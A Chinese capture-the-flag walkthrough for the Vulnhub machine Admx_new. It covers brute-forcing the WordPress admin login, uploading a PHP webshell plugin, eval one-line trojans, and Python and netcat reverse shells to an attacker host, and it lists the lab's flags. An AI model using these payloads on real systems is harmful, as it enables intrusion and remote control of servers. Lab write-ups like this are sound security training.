> 靶机环境介绍
+ [Admx_new](https://www.vulnhub.com/admx/Admx_new.7z)
+ 难度等级 <font color=orange>中</font> （构思非常巧妙）

目标：取得两个 flag + root 权限

**所用技术栈：**
+ 主机发现
+ 端口扫描
+ WEB路径爆破
+ BP自动替换
+ 密码爆破
+ **MSF漏洞利用**
+ **Wordpress漏洞利用**
+ NC反弹SHELL
+ 本地提权
+ 蚁剑上线
+ 利用MySQL提权
+ 另类提权方法


## 主机发现与信息收集

这次渗透测试我们还是使用nmap来进行主机发现 `-sn`参数就相当与ping

![20220507_1711.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/80bdc1c92c01f880965f91de858a6bba.png)

很明显我们这次的靶机的ip地址为 10.0.2.15

端口扫描,发现只开放了一个web端口

![20220507_1715.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/ff2ff5aca31a404b6f80a57bdf4bf8a7.png)
对该端口进行服务版本的发现与扫描
![20220507_1718.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/b776a2e0a6933ad36ccf6dd0d13e3fd0.png)

我们对该服务进行一个基本访问

![20220507_1716.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/7f6385ae63569e979b44e22cc674e418.png)


## WEB路径爆破

这次我们使用一款新的web目录扫描工具 `feroxbuster`


目录发现工具 (dirsearch dirb feroxbuster) 的原理几乎都相同 
安装 `feroxbuster`

一般来说 kali 没安装这款工具，需要我们手动安装,执行下面命令即可
```bash
sudo apt-get update
sudo apt-get install feroxbuster
```
![20220507_1720.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/7744eb53f87919bb7f988e4a06a06bb2.png)

![20220507_1733.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/0388add754afa2f13b738b0386d5cfc7.png)
```bash
feroxbuster -url http://10.0.2.15
```
<font color="red" face=Monaco size=3> feroxbuster 默认使用 seclists 字典来进行爆破 </font>
而 seclists 这个字典包相对来说比较大这边使用 `dirb` 工具下的一个字典来进行扫描爆破

![20220507_1735.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/e1341afce771107430e60588c0f9ca3b.png)

```bash
feroxbuster --url http://10.0.2.15 -w /usr/share/dirb/wordlists/common.txt
```
我们扫描出来很多关于WordPress的目录,这时候我们就可以访问一下wordpress 这个目录
![20220507_1737.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/e7ea3e4c05e7f220c5420327b72d886b.png)

当我们访问 wordpress 页面时我们发现我们需要等待很长一段时间才只加载出来一个没有样式的简陋的页面

## BP自动替换

**这时候我们就想知道，是什么原因导致加载该页面如此缓慢**

![20220507_1739.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/483ea71eee392f9b6d54f4c02707330b.png)

这时候我们可以使用 burpsuit 代理里面的请求记录来进行观察和发现是什么原因导致上面这种现象


![20220507_1744.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/e57657a7301c578b5506a0c373a3ffe1.png)
查看这些请求包

![20220507_1747.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/8d1a3a4fff13fce5a59d7d466ac9bbd8.png)

我们可以发现我们会向 192.168.159.145 这个IP地址请求一系列js文件,而我们靶机在内网环境，IP地址为 10.0.2.15 肯定不能请求到 192.168.159.145 这个IP地址的响应,我们可以利用burpsuit的匹配与替换模块对这个IP地址进行替换


![20220507_1803.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/1e0b8622763fb2b3afb1e49e8ce988ea.png)

![20220507_1806.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/1b4166d31f80bde9c630002c2dd6285b.png)

我们需要将其响应头和响应体内所有的 192.168.159.145 替换成我们靶场的 IP 地址 (10.0.2.15)

![20220507_1811.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/db7bbcadb789702cf36dbb1183108277.png)

这时候我们在访问这个wordpress 这个页面发现相应很快并有一个非常漂亮样式了。

![20220507_1813.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/35e0ad6daad510d2e9e955a1e815cf07.png)


## Wordpress漏洞利用

然后按照惯例我们对该页面进行基本的渗透测试流程，发现并没有什么明显的漏洞

### WordPress 版本发现
<font color="red" face=Monaco size=3> 我们知道在 WordPress 这个框架中历史版本有很多漏洞 </font>这时候 WordPress 版本发现就至关重要了.


1. 通过 `readme.html` 来发现版本
	+ 例如 `C:\wamp\www\example.com` 打开`readme.html`，该文件的正上方显著的位置写着wordpress的版本。好像 wp 4.7 之后就不会在 readme.html 上显示版本号了。

![20220507_1822.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/ec7b18e5e8d1d69f469128255c3f0aac.png)

2. 前端页面发现
	+ 在刚才使用 `readme.html` 这种方式并没有获得到其版本号，说明其版本号可能大于 4.7而我们在查看其源码的时候发现了以下字段 `ver=5.7.1` 而这很有可能就是其WordPress的版本号

![20220507_1825.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/c8101374ac9d8863d2ffef52c0639fef.png)


通过前端发现 WordPress 的版本号，然后去进行相关漏洞的搜索
并没有发现有关的漏洞
在该版本之前有一个 外部实体漏洞 [漏洞信息链接](https://www.freebuf.com/vuls/272446.html) 

这时候我们返回刚才路径发现的地方，发现还有一个 `wp-admin` 的路径，我们猜测该路径是该网站的后台页面，按照惯例我们可以对该路径进行访问测试

经过访问我们可以发现该页面确实是个后台登入页面

![20220507_1834.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/fc5efe624f3b2ab8a81049ec2abd4a36.png)
我们先随便测试个用户名和密码,发现提示用户名不存在，这时候我们就需要去网上搜索wordpress 后台的默认密码和账户进行尝试

![20220507_2248.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/883f58fff9b645a2176fffdcab855cbb.png)

发现给我们提示的错误信息发生了改变 (提示我们密码错误，而不是用用户名不存在) 说明我们的用户名在后端数据库是存在该用户的

![20220507_2307.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/4ecd54562c33cfecec166ca5b99e212a.png)

接下来我们就可以针对该用户进行密码的暴力破解
这边使用一个 Github 的开源字典: [SuperWordlist Download Link](https://github.com/fuzz-security/SuperWordlist) 

![20220507_2311.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/a3988a06227aa05af3a09f8672b565d8.png)
先将 Payload type 改成 `runtime file` 模式,并选择项目中的 `MidPwds.txt` 进行暴力破解尝试

![20220507_2312.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/66860b466b0d8258b77bb9493078aea4.png)

经过很长一段时间可以破解出来 `adam14` 这个密码
,我这边因为已经知道密码了，所以将该密码尝试提前了

![20220507_2325.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/9a50bc4805dd5734a166f7d440200380.png)
我们使用该密码登入后台,发现成功进入 wordpress 的后台

![20220507_2326.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/01e4bf0b8a2d38a4718086e9ca804897.png)

## WordPress 几处提权方式

1. 使用后端内的媒体上传功能

![20220507_2327.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/ad12ff463bf469eb6c7994f85d6b3e6e.png)
2. 通过修改 `Appearance` 相应样式的 `404.php` 文件

![20220507_2336.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/864f85ecb0a0e2f470d0fad29ca884bc.png)

3. 通过上传插件的方式

![20220507_2333.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/238fb8c2f281a115cfce8e69bd28f735.png)


![20220507_2331.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/7514c324cd5137b4f94fc43aea453514.png)

我们先尝试了媒体上传，发现这个wordpress 并没有文件上传漏洞,然后我们进行尝试修改 `404.php` 来尝试使用PHP来反弹WebShell 发现我们并不能成功上传修改.
一句话木马：
```php
eval($_POST['ant']);
```

![20220507_2340.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/77eab588eb70ee8751385bb4de804621.png)

这时候我们还有一个上传插件的方式来获取WebShell
因为 wordpress 插件的编写相对比较简单,且使用的语言是 PHP 所以我们可以通过自己编写的方式,上传自己写的反弹 Shell 插件

**首先我们需要编写 wordpress 的插件** 如下
```php
<?php
/**
* Plugin Name: Fancy WebShell
* Plugin URI: http://zhouhaobusy.com/
* Description: This is a Webshell by Busy To Live
* Version: 1.0
* Author: Busy To Live
* Author URI: http://zhouhaobusy.com
* License: http://zhouhaobusy.com/
*/

if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }

?>
```
因为 wordpress 后端插件上传只接收 zip 文件格式,所以我们先对我们写好的插件进行zip压缩

![20220507_2351.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/dad769629aa2ed1c6d09f30803d0ca62.png)
然后再将该zip文件上传上去.
![20220507_2352.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/557b9094d540e8f131c51e558860e618.png)
看网站的反馈,我们应该是成功上传了我们所编写的插件

![20220507_2353.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/21dac7013ac0854f69dfc826d252cf19.png)

上传成功后我们还需要对我们所上传的插件进行激活,只需要点击 `Activate Plugin` 即可,激活之后我们可以成功在插件列表里看见我们所编写的插件. `Fancy WebShell`


![20220507_2354.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/1f40ba5d19eb413a824a01b9b95fdefc.png)

**默认上传后的插件所在路径：`http://10.0.2.15/wordpress/wp-content/plugins/shell.php?cmd=id`**

我们在插件路径上执行我们想执行的代码，发现成功被执行.说明我们所写的 PHP 插件木马成功生效


![20220507_2356.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/31436f7b868343a27cbaa1997c1e3c57.png)



[AntSword Github Link](https://github.com/AntSwordProject/antSword) 

[AntSword-Loader Github Link](https://github.com/AntSwordProject/AntSword-Loader) 



## 多种反弹Shell的方式

### 使用MSF
先开启 Msf 框架
```bash
masfdb run
```
![20220508_0138.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/941fa35b9547e4d93721c034a6260dcf.png)
查找相关的漏洞利用模块,因为我们已经知道是关于 wordpress 并且已经进入到 wordpress 的后台,这时候我们就可以尝试搜索一下 wordpress 和 admin 这个两个关键字，来查询是否有相关的漏洞利用

![20220508_0139.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/39c3ad3068024d81f713225e5a3aece2.png)
在里面我们查找到一个命令上传的漏洞，这和我们刚才所做的操作完全吻合，这时候我们就可以适当尝试一下这个模块。对目标靶机进行渗透
![20220508_0141.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/33f1b0b805b641ef66bcc7676e5d757d.png)
我们对该模块进行使用
```bash
use 10 # 10 为对应的查询出来的序号
```
![20220508_0142.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/0dbb2882f6cceebd98af7891ba17b5b2.png)

查看我们使用这个模块需要设置扫描参数和配置
```bash
show options
```
在我们查看的设置参数里，有一些是我们必须要设置的，不设置就不能进行利用，还有一些配置是可选项,下面我们对一定要设置的选项进行设置

![20220508_0143.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/1d54e1c4acdd3ce5e364f8fc19215966.png)
分别根据我们靶机的情况与信息进行相应的设置
![20220508_0158.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/623377b30cd7b937a167e2297293c641.png)
查看我们设置好后的payload
![20220508_0155.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/73eebf32d300b69817d68cde82add519.png)
我们运行该payload 对目标靶机进行漏洞利用
![20220508_0153.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/30e9d50189717ffdbbd9c8ef52e6daf8.png)

发现成功利用该模块
但我们发现使用 MSF 的方式有一些命令并不能使用，如下面的 `pwd ls` 都不能使用，说明在这个靶场环境下，使用MSF并不是一个最好的选择
![20220508_0154.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/7decacb6aab6c7afb739a33489143b57.png)



### 使用Python

在前几次的打靶过程，我们已经知道了使用 python 也能反弹 Shell 这时候我们就可以尝试一下使用 Python 来进行反弹Shell 我们先确认一下靶机环境中是否存在 Python环境,经过一定的尝试，发现目标靶机内存在 python3 的环境
![20220508_0131.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/8ecf2330860e9c38448e9aa8a9dd60f7.png)

这时候我们就可以通过上传下面的代码来进行反弹 Shell
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.7",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

<font color="red" face=Monaco size=3> 使用 `subprocess()`函数获取 Shell 可能会出现一些终端格式问题,从而导致后续升级 Shell 失败</font>

在上传前记得先在攻击机上监听对应端口

![20220508_0136.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/e4ed9d6d11c9fc750664010d15c39c95.png)
成功使用Python获得Shell


### 使用 NC

使用 NC串联的方式来反弹Shell 前几次都进行过详细的介绍与实践，这边就不在赘述了，对该技术还不太了解的，可以去阅读我前几篇博文

![20220508_0130.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/f9f7b830009f3b03d445318d5581a4d0.png)

```bash
nc 10.0.2.7 3333 | /bin/bash | nc 10.0.2.7 4444
```

### 使用AntSword

<font color="red" face=Monaco size=3> 使用 AntSword 来反弹Shell 在这个靶机环境中我们需要以下条件:</font>
 我们已经获得了一个基本Shell,并对该 Shell 进行了升级,能使用 vim 和 自动补全

首先我们根据网页使用的主题样式来找到对应的目录下,并修改该目录下的 `404.php` 而这台靶机的对应的主题目录在 :

`/var/www/html/wordpress/wp-content/twentytwentyone` 

![20220508_0202.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/324195407ad3f6db5470cc0959054800.png)

![20220508_0230.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/d3a5efe4463bde4f96e47327c92197fd.png)


然后在 该文件内添加一句话木马
```php
eval($_POST['BusyToLive']);
```
![20220508_0233.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/3fa7a7d0b4f02893361d9a6cd1ef2565.png)

这时我们就可以使用蚁剑来测试我们添加的一句话木马是否成功生效

![20220508_0238.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/491ef7c2b7db97a757fedbf98b7cdd2b.png)

成功使用 AntSword 获取到蚁剑反弹的 Shell
![20220508_0239.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/49dd5f5e3fe4e9f2566b68e06ca0ab84.png)




## **升级shell**

<font color="orange" face=Monaco size=3> 使用以下方式进行 反弹 Shell 只使用于 Bash </font>


将我们已经获得的反弹Shell中先按 <kbd class="keybord"> Ctrl </kbd> + <kbd class="keybord"> Z </kbd>&ensp;将当前(反弹Shell)的终端调到后台

查看当前用户所使用的命令解释器,并修改用户的默认命令解释器



```bash
stty raw -echo
```
运行这条命令之后
![20220508_0207.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/920aef1140db6e3f12125a1f3915f14b.png)
如果使用普通用户需要在普通用户下运行下面命令

**重启之前需要将shell的类型改为bash**

```bash
chsh -s /bin/bash
```

![20220508_0210.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/49be76ce0560b32f8b46ff82bdb001c9.png)

重启之后发现我们成功修改了默认命令解释器

![20220508_0212.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/c4daf212fa1159221f8d114a0af25878.png)

然后根据前面的操作重新获得shell并 <kbd class="keybord"> Ctrl </kbd> + <kbd class="keybord"> Z </kbd>&ensp; 将其置入后台运行,再一次输入以下命令

```bash
stty raw -echo
```

运行成功之后在输入以下命令，调出要升级的shell

```bash
fg # fg 命令就是将后台运行进程掉到前台
```

然后在目标靶机终端内输入以下命令

```bash
export SHELL=/bin/bash
export TERM=screen
stty rows 38 columns 116
reset
```
![20220508_0229.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/f0174358793b0f65f02e8aeee5ccc69a.png)

这时候我们就对这个靶机的反弹shell升级成功了
<font color="red" face=Monaco size=3> 我们可以使用自动补全，和vim等交互命令 </font>

---

当我们获得了一个目标靶机的shell不管权限多么低，我们都应该要把这个shell给拿牢

在真实环境中如果仅仅使用nc 获得shell，如果其连接断了的话，我们还需要重新执行前面所做的一切操作

<font color="red" face=Monaco size=3>  而有时候的漏洞利用使用完一次，第二次很有可能就失效了，这时候如果想要再获得目标靶机的shell就只能找别的漏洞了</font>，而再寻找别的漏洞就非常困难了.

**所以当我们已经有了一个shell之后我们及需要做的事情就是加固完善我们的 shell 至少需要2-3种不同的方式的 shell**



## 本地提权


首先我们知道 wordpress 里有一些配置文件,而配置文件里面有一些关于数据库啥的信息，很有可能对我们渗透有帮助


这个时候我就想通过wordpress 的配置文件的来获取一些能够帮助我们提权的信息如密码之类的
其配置文件在 wordpress 主目录下
名字为 `wp-config.php`

![20220508_0252.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/72f5325daeb979c5a8917f816db6c0b4.png)

发现里面有个用户名和密码
经过尝试，发现该密码并不正确

我们发现登入web界面的密码 adam14

flag1
153495edec1b606c24947b1335998bd9

flag2 
7efd721c8bfff2937c66235f2d0dbac1





按照惯例我先查询一下该靶机内有啥用户是拥有命令行

![20220508_0247.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/fbc7e01ecf11ff2f07ba804fd037abcc.png)

![20220508_0248.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/dc74b03a46acc58c0e9d534a36f8e889.png)

![20220508_0249.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/dcf48353400afcc637b25fa88ea2cfb4.png)


![20220508_0254.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/8884f27c975add74725d2d0e6c6e62d2.png)
![20220508_0254_1.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/2cb3c3bc5c1bc9b8c29be69387c8479c.png)
![20220508_0257.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/d23df4e202536ffa1a17729285c3a37a.png)
![20220508_0258.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/49d21e633bd3b0a54b74b030f13ffdb5.png)
![20220508_0258_1.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/7e4d45f43be585e361f9ddbd80808ca5.png)

![20220508_0259.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/035277e96c4d3a3b1c8ac2e0c5293d33.png)


![20220508_0302.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/1335ba8a84296213a3fb9371fa85f24b.png)
